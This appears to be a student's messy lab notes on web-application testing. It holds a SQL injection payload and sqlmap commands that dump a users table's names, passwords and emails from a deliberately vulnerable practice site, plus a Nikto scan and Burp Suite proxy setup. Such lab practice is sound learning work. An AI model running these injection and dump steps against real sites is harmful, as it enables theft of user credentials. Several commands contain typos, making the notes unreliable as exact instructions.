# Mysql

1. Sudo su 

2. cd Desktop

3. apt install update

4. apt install mysql

6. Victim Server : testphp.vulnweb.com

7. Kali linux 

8. Find the Parameters

9. http://testphp.vulnweb.com/listproducts.php?cat=1or1=1

￼

 

10. Parameter :  http://testphp.vulnweb.com/listproducts.php?cat=1

 

11. Tool :SQLmap 

12. 

￼

 13. sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1


14. sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 —dbs 

 

15. sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart —tables

 

16. sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users —columns

 

17. sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users —C name, pass,email,name —dump

<br>
-Nikto

-dirb

-dirbuster

 

1. Open the Terminal 

2. nan nikto

3. nikto -host certifiedfhacker.com

4. - Nikto v2.1.6

---------------------------------------------------------------------------

+ Target IP:          162.241.216.11

+ Target Hostname:    certifiedhacker.com

+ Target Port:        80

+ Start Time:         2024-05-03 05:35:36 (GMT-4)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Burpsuite  : 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 

1. Burp suite

2. Click ok

3. No Update

4. Next >> Start Burp

10.  Add on /Install

11. Can See Icon on Firefox

12. Click Option 

13. Name : Burp

14. IP :127.0.0.1

15. Port : 8080

16 Save 

 

17. Open new Tab :    http://burp

18

￼

 

18. Click on CA Certificate 

 

￼

19. It will Downlaod the Certificate 

20. Setting > cert > authorities >> Import

21. Select the Certificate from Files 

22. Checkmarcks  >>>> Mark both of them 

23. Ok

24. Check : Turn Burp On and Then. Access Google 

25 Success.